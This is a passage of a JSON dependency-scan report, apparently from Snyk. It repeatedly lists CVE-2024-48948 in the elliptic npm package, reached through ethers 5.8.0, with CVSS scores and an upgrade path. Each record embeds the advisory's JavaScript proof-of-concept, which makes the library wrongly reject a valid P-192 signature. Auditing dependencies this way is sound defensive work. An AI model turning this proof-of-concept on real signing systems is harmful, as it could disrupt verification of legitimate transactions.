            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, 